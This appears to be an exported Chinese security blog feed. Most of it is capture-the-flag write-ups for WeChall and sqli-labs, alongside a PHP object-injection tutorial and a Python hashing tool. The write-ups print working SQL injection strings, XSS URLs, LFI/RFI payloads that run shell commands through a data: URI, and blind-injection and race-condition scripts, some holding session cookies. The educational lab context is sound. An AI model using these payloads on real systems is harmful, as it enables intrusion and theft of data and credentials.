mysql_real_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]); if($pass==$re_pass) { $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;; $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;); $row = mysql_affected_rows(); ... 可以发现 $sql = “UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ “; 更改密码时$username没有任何过滤，直接带入进去，如果$username后面有个注释符，那么我们可以直接绕过验证$curr_pass而直接更改密码。 所以我们要建一个有注释符的特殊用户 用户名：admin&apos;+#+ 密码： 123456 然后登陆，进入更改密码页面 随便输入当前密码，然后输入我们要更改的密码 YOU ARE LOGGED IN AS admin&apos; # You can Change your password here. Current Password: 123 New Password: 123456 Retype Password: 123456 提交，你会发现，admin的密码已经被我们改成123456了。 Less-25这题的意思是，“你的 AND 和 OR 都是我们的了！”… 就是，AND 和 OR 全部都被过滤掉了。 AND==&amp;&amp; OR==|| ?id=1&apos; &amp;&amp; &apos;1&apos;=&apos;1 url编码 ?id=1&apos; %26%26 &apos;1&apos;=&apos;1]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python实现MD5,Base64加密小工具]]></title>
    <url>%2F2016%2F07%2F29%2Fpython%E5%AE%9E%E7%8E%B0MD5_Base64%E5%8A%A0%E5%AF%86%E5%B0%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[程序是一个 Base64 和 MD5 加密解密的程序。很简单，主要用到了hashlib和base64这两个库。而且，有这两个库，可以随时拓展更多种加密方式，像是 sha 啊什么的。要注意的就是下面几点： 1）input()和raw_input()的区别。input()要求的输入的字符串要加双引号，数字的话，直接输入就可以了。 raw_input()函数将输入的所有数据都当做字符串来看待，即使输入的数字，也会变成是字符串的形式。而且，我们经常要在程序运行到某处的时候中断一下。那么，就可以用raw_input()这个函数来中断。输入回车就继续运行了。若是用input()中断的话，直接回车会爆错。。 2）Python 里面貌似没有主函数的说法没有main()，没有入口点。那么怎么办呢？可以用下面的代码： if __name__==&quot;__main__&quot;: Index(); //你的第一个函数 这样就可以让程序从第一个函数开始运行了。 3）千万注意 TAB 和空格。也就是代码的格式。Python 是一个很注重格式的语言。因为没有大括号之类的，所以像是循环语句，判断语句的，一定要注意语句前面的 TAB。而且，千万不要 TAB 和空格混用！会报错. import hashlib import base64 def Index(): print(&quot;---------Joy_nick&apos;s Encrypt Tool---------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) MD5&quot;); print(&quot;2) Base64&quot;); while(1): choose=input(); if(choose==1): Page_MD5(); elif(choose==2): Page_Base64(); def Page_MD5(): print(&quot;----------------MD5----------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) MD5 Encrypt&quot;); print(&quot;2) MD5 Check&quot;); while(1): choose=input(); if(choose==1): Page_MD5_Encrypt(); elif(choose==2): Page_MD5_Check(); def Page_Base64(): print(&quot;--------------Base64---------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Base64 Encrypt&quot;); print(&quot;2) Base64 Decrypt&quot;); while(1): choose=input(); if(choose==1): Page_Base64_Encrypt(); elif(choose==2): Page_Base64_Decrypt(); def Input_From_File(): path=raw_input(&quot;Please input the file path : &quot;); file_handle=open(path,&apos;r&apos;); file_contant=file_handle.read(); file_handle.close(); return file_contant; def Input_From_Stdin(): contant=raw_input(&quot;Please input : &quot;); return contant; def Page_MD5_Encrypt(): print(&quot;-----------MD5 Encrypt------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=hashlib.md5() m.update(contant); print(&quot;Do you want to output to a file?(y or n)&quot;); while(1): choose=raw_input(); if(choose==&apos;y&apos;): file_handle=open(m.hexdigest(),&apos;w&apos;); file_handle.write(m.hexdigest()); file_handle.close(); exit(); elif(choose==&apos;n&apos;): print(m.hexdigest()); raw_input(); exit(); def Page_MD5_Check(): print(&quot;-----------MD5 Check------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=hashlib.md5() m.update(contant); MD5=raw_input(&quot;Please input the original MD5:&quot;); if(MD5==m.hexdigest()): print(&quot;It&apos;s a correct file.&quot;); else: print(&quot;The file is wrong.&quot;); raw_input(); exit(); def Page_Base64_Encrypt(): print(&quot;-------------Base64 Encrypt----------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from a file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=base64.b64encode(contant); choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;); while(1): if(choose==&apos;y&apos;): file_handle=open(&quot;Base64_%c&quot;%m[1],&apos;w&apos;); file_handle.write(m); file_handle.close(); exit(); elif(choose==&apos;n&apos;): print(m); raw_input(); exit(); def Page_Base64_Decrypt(): print(&quot;--------------Base64 Decrypt------------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from a file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=base64.b64decode(contant); choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;); while(1): if(choose==&apos;y&apos;): file_handle=open(&quot;Base64_%c&quot;%m[2],&apos;w&apos;); file_handle.write(m); file_handle.close(); exit(); elif(choose==&apos;n&apos;): print(m); raw_input(); exit(); if __name__==&quot;__main__&quot;: print(&quot;main&quot;); Index();]]></content>
      <tags>
        <tag>编程</tag>
        <tag>加密解密</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python脚本之正则表达式]]></title>
    <url>%2F2016%2F07%2F28%2Fpython%E8%84%9A%E6%9C%AC%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Impossible n’est pas françaiswebchall的一道题，题目要求分解一个很大的数的质因数。需要6s 内提交 但是，只要我们尝试提交一次之后，就可以发现它会返回一个正确的解。既然如此，我们只要先提交一次，然后程序读取它返回的正确数字串，再提交就可以了。 在匹配网页信息的时候，python可以使用库beautifulsoup也可以使用正则表达式re模块，这里我两个都用了，便于自己学习。 python脚本如下： #!/usr/bin/env python # coding=utf-8 import requests import urllib2 import lxml import lxml.html as H from bs4 import BeautifulSoup cookie = { &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos; } def get_number(): number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos; #opener = urllib2.build_opener() #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;)) #f = opener.open(number_url) #html = f.read() #html = urllib2.urlopen(number_url).read() #soup = BeautifulSoup(html) resp = requests.get(number_url, cookies=cookie) res =resp.content soup = BeautifulSoup(res) div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;}) movie_new = div_new.get_text() print movie_new get_number() def get_answer(): post_data = { &apos;solution&apos;: &apos;&apos;, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; resp = requests.post(url, cookies=cookie, data=post_data) # print resp.text d = H.document_fromstring(resp.text) import re ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;) text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content() ans = ar.findall(text)[0] print ans post_data = { &apos;solution&apos;: ans, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } resp = requests.post(url, cookies=cookie, data=post_data) print resp.text get_answer() 运行结果为：]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP Object Injection]]></title>
    <url>%2F2016%2F07%2F24%2FPHP-Object-Injection%2F</url>
    <content type="text"><![CDATA[PHP对象注入并不是一种十分常见的漏洞，这种漏洞可能会比较难利用，但是这种漏洞可能比较危险。为了学习这种漏洞，首先需要理解基础的PHP代码。 0x01 PHP的类和对象HP中的类和对象理解起来很简单，举个例子来说，下面的代码中就定义了一个包含一个变量和一个方法的类： &lt;?php class TestClass //定义一个TestClass类 { public $variable = &apos;This is a string&apos;; // 一个变量 public function PrintVariable() // 一个简单的方法 { echo $this-&gt;variable; } } $object = new TestClass(); // 创建一个对象 $object-&gt;PrintVariable(); // 调用类的方法 ?&gt; 0x02 PHP自动载入在PHP中，我们可以定义一些特殊函数，它们可以被自动地调用，所以这些函数不需要函数调用来执行它们里面的代码。考虑到这个特性，这些函数通常被称为魔幻函数或魔幻方法。魔幻方法的名字以双下划线“__”开头PHP魔幻方法名称受限于PHP所支持的部分关键字，例如construct、destruct等等。 例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。 下面是PHP中的一些魔幻函数： __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone(), and __autoload(). 0x03 PHP对象的序列化与反序列化php允许保存一个对象方便以后重用，这个过程被称为序列化，即serialize()函数，对应的反序列化就是unserialize()。简单的说，序列化就是把PHP对象按照一定规则存成一个字符串，而反序列化就是把序列化之后的字符串恢复成一个PHP对象. PHP对象的序列化 理解序列化的字符串: O:4{ 以分号隔开，一共有四段数据 &quot;test&quot;:2 test类，一共有2个对象 s:8:&quot;username&quot; String类型, 长度为8, 值为username s:6:&quot;serial&quot; String类型, 长度为6, 值为serial s:8:&quot;password&quot; String类型, 长度为8, 值为password s:6:&quot;serial&quot; String类型, 长度为6, 值为serial PHP对象的反序列化 经过unserialize()之后，我们的对象又被重建了出来. 0x04 PHP对象注入有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。 那么，考虑这么一个场景，如果一个攻击者的数据是通过unserialize()方法传递的，那么这样就很可能引发“php对象注入”，而很可能那些与该对象有关的Magic方法会执行一些效果，打个比方，如果该对象是一个记录临时文件的对象，当对象创建的时候，即会调用 __construct方法，此时会创建一个文件，而 __destruct则会删除创建的文件。而此时恰好我们可以构造输入通过unserialize()传递，那么我们就可以对我们的输入稍作加工就可以完成输入我们想要输入的。 示例代码： &lt;?php class test { public $filename = &apos;temp.txt&apos;; public function LogData($text) { file_put_contents($this-&gt;filename, $text, FILE_APPEND); //file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。 } public function __destruct() { unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename); //unlink() 函数删除文件 } } class user { public $age = 0; public $name = &apos;&apos;; public function PrintData() { echo &apos;Username:&apos;.$this-&gt;name.&apos;&lt;br&gt;&apos;.&apos;age:&apos;.$this-&gt;age; } } if(isset($_GET[&apos;user&apos;])) $usr = unserialize($_GET[&apos;user&apos;]); ?&gt; 定义了一个test类生成一个临时文件和一个user类，最后有一个 “unserialize” 值，它的本意是传递user的信息，但是如果我们输入一个字符串最后能够被反序列化为test类，那么问题就关键了，因为一个test类最后会删除它的同名文件夹，如果此时我们通过如下代码构造一串字符串： &lt;?php //include &apos;object_injection.php&apos;; class test{} $obj = new test(); $obj-&gt;filename = &apos;.htaccess&apos;; echo serialize($obj) . &apos;&lt;br /&gt;&apos;; ?&gt; 运行结果为： O:4:”test”:1:{s:8:”filename”;s:9:”.htaccess”;} 新建一个.htaccess的文件,然后将打印出来的结果传入到之前那个php中，那么最终删除的就是这个’.htaccess’文件了。因为脚本结束时 __destruct会被调用，从而触发删除。 这就是该漏洞名字的由来：作为一个攻击者，为了实现执行你的代码或者对你来说其他未预料到的有用的表现，不使用期望的序列化的对象，而是注入其他的PHP对象。 0x05 PHP对象注入防御在处理由用户提供数据的地方不要使用“unserialize”，你可以使用“json_decode”。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wechall CTF writeup2]]></title>
    <url>%2F2016%2F07%2F23%2FWebchall-CTF-writeup2%2F</url>
    <content type="text"><![CDATA[htmlspecialcharshtmlspecialchars()不加参数只会将双引号实体化，这里只需要单引号即可。 在本地搭建环境，代码如下： &lt;?php if(isset($_GET[&apos;in&apos;])) { $a=$_GET[&apos;in&apos;]; echo &quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;; echo htmlspecialchars(&quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;); } ?&gt; 输入以下代码： http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1) 然后鼠标触发即可弹窗。 Connect the Dots盲文密码 解密为：thesolutionis*** Tracks主要分三步： 1.注册 2.投票 3.说已投过了 通过改它请求的地址，来改变http缓存。第二步的时候发现响应头有个Etag字段，这个和请求头里面的If-None-Match进行匹配。 HTTP协议缓存策略 修改请求头里的WC字段和VOTE字段即可。 PHP 0818PHP弱类型 首先看一下源码： function noother_says_correct($number) { $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { return false; } } return $number == &quot;3735929054&quot;; } 主要的意思就是不能是1~9的数字，但是又要和3735929054相等，明显是PHP弱类型由于是==， ===会比较两个变量的类型 而==只比较他们的值 比如整数0和浮点数0.0 用==比较返回TRUE 用===比较返回FLASE 3735929054的十六进制即0xdeadc0de,0又刚好不在1-9里面，符合。 Addslashesaddslashes()函数的功能是返回在预定义字符之前添加反斜杠的字符串。 主要的源码如下： &lt;?php function asvsmysql_login($username, $password) { $username = addslashes($username); $password = md5($password); ... $query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot;; ... if ($result[&apos;username&apos;] !== &apos;Admin&apos;) { return htmlDisplayError(&apos;You are logged in, but not as Admin.&apos;); } return htmlDisplayMessage(&apos;You are logged in. congrats!&apos;); } ?&gt; addslashes()函数存在宽字节注入漏洞。原因是%bf%27本身不是一个有效的GBK字符，但经过addslashes()转换后变为%bf%5c%27，前面的%bf%5c是个有效的GBK字符，所以%bf%5c%27就会当作一个字符加一个单引号，这样漏洞就触发了。mysql_real_escape_string()也是一样。 输入 %bf%27 union select Admin%23&amp;password=123 报错，说不识别这五个字母，然后就是把字母转换成字符 %bf%27 union select CHAR(65,100,109,105,110)%23&amp;password=123 The Guestbook源码很长，也没仔细看，首先就是先做了一个正常的留言，返回的结果如下： 仔细看，我们就可以发现一个蹊跷，就是返回一个ip:8.8.8.8这是我火狐的一个插件，然后我就试试，在里面插入一些恶意代码: $query = &quot;CREATE TABLE IF NOT EXISTS gbook_user ( &quot;. &quot;gbu_id INT(11) UNSIGNED PRIMARY KEY, &quot;. # Guestbook userid &quot;gbu_name VARCHAR(63) CHARACTER SET ASCII COLLATE ascii_general_ci, &quot;. # Guestbook username &quot;gbu_password VARCHAR(255) CHARACTER SET ASCII COLLATE ascii_bin ) &quot;; # Guestbook password &lt;-- You need the password for username Admin $db-&gt;queryWrite($query); 上面的代码看出表名是：gbook_user，字段:gbu_password,gbu_name 根据GET ip的查询语句，构造如下： ‘,(select gbu_password from gbook_user where gbu_name=’admin’))# PHP 0816题目要求我们读solution.php这个文件。 主要就是几个参数，src，hl，mode，它是按顺序读取参数值的， php0816SetSourceFile主要是设置显示源码的文件名，有一个白名单过滤，它会读取src， 然后是php0816execute执行程序mode=hl， 然后就是php0816addHighlights，它调用php0816Highlighter，而这个函数直接有一个getGet(&apos;src&apos;) 所以我们可以直接执行mode=hl&amp;src=solution.php，，这样就没有访问php0816SetSourceFile这个函数。直接读取了solution.php POC： http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php Table Names在username加个’ 报错了，存在注入 ，构造语句。 1&apos; order by 4# 报错 1&apos; order by 3# 正确 三个字段 1&apos; and 1=2 union select 1,2,3# 显示3 1&apos; and 1=2 union select 1,2,database()# 数据库名：gizmore_tableu61 1&apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x67697A6D6F72655F7461626C65753631# 两个表名：aaawrong,usertableus4 TMD 对于答案也是醉了,还得连一块： gizmore_tableu61_usertableus4 Training: RegexMini正则匹配 成功的要求是输入一个长度 &gt; 16 位的一个用户名，并成功注册。 正则表达式为： /^[a-zA-Z]{1,16}$/ 在 php 的正则里面，^$的意思是匹配前一个换行符之后，下一个换行符之前，这中间一段的字符。所以，我们只需要输入16个任意大小写字母，再加上一个换行符（%0A) 就可以了。 Are you serialPHP对象注入 Yourself PHPPHP的$_SERVER[‘PHP_SELF’]造成的XSS漏洞. 测试代码如下： &lt;?php //require &apos;check.php&apos;; if (isset($_POST[&apos;username&apos;])){ echo sprintf(&quot;Well done %s, you entered your username. But this is not what you need to do.&quot;, htmlspecialchars($_POST[&apos;username&apos;])); } echo &apos;&lt;div class=&quot;box box_c&quot;&gt;&apos;.PHP_EOL; echo sprintf(&apos;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&apos;, $_SERVER[&apos;PHP_SELF&apos;]).PHP_EOL; echo sprintf(&apos;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL; echo sprintf(&apos;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL; echo sprintf(&apos;&lt;/form&gt;&apos;).PHP_EOL; echo &apos;&lt;/div&gt;&apos;.PHP_EOL; ?&gt; 构造POC： http://127.0.0.1:8080/xss/test1.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; 效果如下： PHP 0819PHP heredoc 题的意思就是让eval=’1337’,但是过滤了单引号，使用heredoc便能绕过对于引号的过滤，注入想要的字符串。 php 中的 heredoc技术是php用来引用字符串的一种方式。在phpwind中巧妙的运用了这个技术，实现了逻辑代码和界面设计的分离。 语法： 1. 使用操作符 “&lt;&lt;&lt;” 2. 操作符后紧跟标识符（开始标识符），之后重起新的一行 输入要引用的字符串，可以包含变量。 3. 新的一行，顶格写结束表示符，以分号结束。 要注意到几点： 1. 标识符可以自定义 一般的 有EOT ，EOD EOF 等， 只要保持开始表示符和结束表示符一样即可。 2. 结束表示符必须独占一行，且必须顶格写，最后以 ‘;’ 分号结尾。 3. 所有引用的字符串中可以包含变量，无需字符串连接符。 例如： echo &lt;&lt;&lt;suibian 正文 正文 suibian; // 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;换行 构造POC： http://www.wechall.net/challenge/space/php0819/index.php?eval=&lt;&lt;&lt;s%0a1337%0as;%0a MD5.SALT简单的sql注入 最后构造语句： ‘ and 1=2 union select password,2 from users where username=”Admin”# Order By Queryorder by 注入。 1.可以使用and进行双重查询 1 and (select count(*) from products group by concat(version(),0×27202020,floor(rand(0)*2-1)))– 2.在desc/asc [参数] 之后使用双重查询 1 desc,(select count(*) from users group by concat(version(),0x27202020,floor(rand(0)*2-1)))&#39;5.0.95-community&#39; 具体的请参照：order by/limit之后注入 关于报错注入的一些语法请参照：报错注入方法整理 构造POC： http://www.wechall.net/challenge/order_by_query/index.php?by=1 and ExtractValue(1,(select password from users where username=CHAR(65, 100, 109, 105, 110)))# 得到MD5： C3CBEB0C8ADC66F2922C65E7784BE14 Can you read metesseract这个软件可以做ocr Crappyshare构造POC: http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php 当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的 推荐一篇文章：LFI、RFI、PHP封装协议安全问题学习 Warchall: Live LFI进去之后发现左上角，有个按钮，直改后面的参数为solution.php, POC1:http://lfi.warchall.net/index.php?lang=solution.php 回应如下： teh falg si naer! the flag is near! PHP Warning(2): Illegal string offset &apos;welcome&apos; in index.php line 12 Backtrace starts in index.php line 12. GWF_Debug::error_handler() core/inc/util/GWF_Debug.php line 183. 本地文件包含，使用php://filter/read读一下solution.php的源码 POC2: http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php base64解密： &lt;html&gt; &lt;body&gt; &lt;pre style=&quot;color:#000;&quot;&gt;teh falg si naer!&lt;/pre&gt; &lt;pre style=&quot;color:#fff;&quot;&gt;the flag is near!&lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php # YOUR_TROPHY return &apos;SteppinStones42Pie&apos;; # &lt;-´ ?&gt; Warchall: Live RFI能查看页面能容的PHP伪协议，我知道的只有两种： ?file=data:text/plain,&lt;?php system(&quot;net user&quot;)?&gt; ?file=php://filter/read=convert.base64-encode/resource=index.php 我使用filter读协议出来了竟然： PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K 但是解密发现不对有？？？，然后我发现base64里面有好多重复的，然后我删除点 &lt;html&gt; &lt;body&gt; &lt;pre&gt;NOTHING HERE????&lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php return &apos;Low_H4NGING_Fruit&apos;; ?&gt; 好吧，，， 试了试data协议,也可以。 http://rfi.warchall.net/index.php?lang=data:text/plain,&lt;?php system(“cat solution.php”)?&gt; Impossible n’est pas français分解一个很大的数的质因数。需要6s 内提交 但是，只要我们尝试提交一次之后，就可以发现它会返回一个正确的解。 既然如此，我们只要先提交一次，然后程序读取它返回的正确数字串，再提交就可以了。 python脚本如下： #!/usr/bin/env python # coding=utf-8 import requests import urllib2 import lxml import lxml.html as H from bs4 import BeautifulSoup cookie = { &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos; } def get_number(): number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos; #opener = urllib2.build_opener() #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;)) #f = opener.open(number_url) #html = f.read() #html = urllib2.urlopen(number_url).read() #soup = BeautifulSoup(html) resp = requests.get(number_url, cookies=cookie) res =resp.content soup = BeautifulSoup(res) div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;}) movie_new = div_new.get_text() print movie_new get_number() def get_answer(): post_data = { &apos;solution&apos;: &apos;&apos;, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; resp = requests.post(url, cookies=cookie, data=post_data) # print resp.text d = H.document_fromstring(resp.text) import re ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;) text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content() ans = ar.findall(text)[0] print ans post_data = { &apos;solution&apos;: ans, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } resp = requests.post(url, cookies=cookie, data=post_data) print resp.text get_answer() 运行结果为： Py-Tong查看 Python 源代码，可以发现，该程序会读取一个你指定的文件两次。 如果第一次读取成功之后，第二次尝试读取失败，返回true。 如果第一次和第二次读取得到的内容不一样，返回true。 这样，知道了这些之后，我们就可以写一个文件，去和这个程序进行竞争。 Blinded by the light盲注 主要的代码为： $query = “SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=’$password’”; 这里的 password 明显没有经过过滤就带入查询。那么，我们可以通过 OR 盲注来让它返回不同的页面，借此来判断语句的正确性。 脚本如下： #!/usr/bin/env python2 import urllib import urllib2 def makePayload(statement): return &quot;&apos; or substring(password, %d, 1)%s&apos;%s&quot; % (statement[0], statement[1], statement[2]) def checkResponse(response): return response.find(&quot;Welcome back&quot;) &gt; 0 def doAssert(statement): url = &apos;http://www.wechall.net/challenge/blind_light/index.php&apos; values = {&apos;injection&apos;:makePayload(statement),&apos;inject&apos;:&apos;Inject&apos;} data = urllib.urlencode(values) req = urllib2.Request(url, data) req.add_header(&apos;cookie&apos;,&apos;WC=8448003-14306-bFzUNqXxpwMud1xu&apos;) response = urllib2.urlopen(req) content = response.read() return checkResponse(content) if __name__ == &quot;__main__&quot;: alphalist = &quot;0123456789ABCDEF&quot; result = [] for idx in range(1,33): start = 0 end = 16 #[start, end) while (start &lt; end): print(&quot;[%d, %d)&quot; % (start, end)) if (end - start == 1): result.append(alphalist[start]) break else: middle = (start + end)/2 if(doAssert([idx, &apos;&lt;&apos;, alphalist[middle]])): end = middle else: start = middle print &apos;&apos;.join(result) Training: Net Ports让我们链接这个主机的42端口。 curl使用 –local-port 参数,带上自己的cookies sudo curl –local-port 42 -c ‘WC=YOUR_COOKIES’ http://www.wechall.net/challenge/training/net/ports/index.php Pimitive Encryption用onetime-pad xor加密的zip文件,通过zip的magic number可以确定onetime-pad的前四位,转换成char输出后发现是3.14 于是该用什么解密就很明显了,下载一个pi之后xor一下,就能还原了 Repeating History网页和github是对应的。。 先翻到第一个 https://github.com/gizmore/gwf3/blob/565015f6561776c90f77e5623d978d70ca7bf2d3/www/challenge/subversive/repeating/what_do_you_want_here.php 然后repo内搜索solution发现了一个 https://github.com/gizmore/gwf3/blob/a98616544df4997a1bef7dfc109d35b3c6e0aab9/www/challenge/subversive/history/install.php md5解出来是wrong，翻一下这个文件的commit记录 https://github.com/gizmore/gwf3/commit/a98616544df4997a1bef7dfc109d35b3c6e0aab9 -$solution = ‘NothingHereMoveAlong’; +$solution = ‘2bda2998d9b0ee197da142a0447f6725’; 拼接一下：InDaxInNothingHereMoveAlong Host Me改http头的Host。这点很简单，但是有个问题就是，它内网有一台机器也叫做localhost。这就导致了如果是简简单单地访问localhost的话，其实访问的是那台机器而非我们做题的机器。为了避免这个问题，我们就要使用绝对路径的 URL，就是 GET 后面的网址补全，然后 Host 再写成localhost就可以了 Stegano Woman打开之后注释部分使用16进制编辑器打开 发现是09(tab)和20(space),把其中的一个当作1另一个当作0,换成二进制再转换成字符串之后输出即可 Quangcurrency这题不会，没看懂，附一个别人的writeup 读题是很重要的…来把这个题目大概念出来,它是什么?concurrency对不对?又是一道竞态的题目. 只要卡着buy和click,想方设法跑到10个item就可以 cookie = { &apos;WC&apos;: &apos;8429765-12152-0vjRl2XoKWFYAmvh&apos; } def f1(): requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/click.php&apos;, cookies=cookie) def f2(): requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/buy.php&apos;, cookies=cookie) import requests import threading import time import lxml import lxml.html as H import re r = re.compile(r&apos;\w+: (\d+)&apos;) i = 0 while True: i += 1 print &quot;turn %d&quot; % i print &apos;start click&apos; t1 = threading.Thread(target = f1) print &apos;start buy&apos; t2 = threading.Thread(target = f2) t1.start() t2.start() t1.join() t2.join() text = requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/stats.php&apos;, cookies=cookie).text d = H.document_fromstring(text) msg = d.xpath(&apos;//div[@class=\&apos;box_c\&apos;]&apos;)[0] # import pdb;pdb.set_trace() a,b,c = r.findall(msg.text_content()) print &apos;get %s item &apos; % c if int(c)&gt;=10: break if int(a) &lt; 1000: print &apos;reset&apos; requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/reset.php&apos;, cookies=cookie) 友情提示,它肯定可以跑出来,但它永远不会停下,最好自己确认这个challenge是不是已经完成了. Stop us关键在于这句话 ‘ignore_user_abort’ =&gt; false 这句话所造成的后果就是，一个脚本当用户断开连接（关闭窗口之类的），这个脚本就会被强行终止。再看看 php 脚本，可以发现它是先给我们添加了一个域名，之后才扣费的。所以我们只要在扣费前关掉页面即可。 Screwed SignupISCC2016的一道题 SQL table里username最多24个字符，但是preg_match检查时可以最多到64个。于是这里可能造成截断. Table Names IIhttp://www.wechall.net/challenge/table_names/challenge.php ?username=&apos; union select database(),2,group_concat(0x3f,table_name) from information_schema.tables where table_schema=database() -- &amp;password=test &amp;login=login 也可以这样： http://www.wechall.net/challenge/table_names/challenge.php ?username=&apos; union select 1,2,info from information_schema.processlist-- &amp;password=test &amp;login=login 运行结果为： Welcome back gizmore_tableu61 Your personal welcome message is: ?aaawrong,?usertableus4 This ensures you are not on a fake evil phising site. 提交：gizmore_tableu61_usertableus4 AUTH meSSL 加密传输的问题。 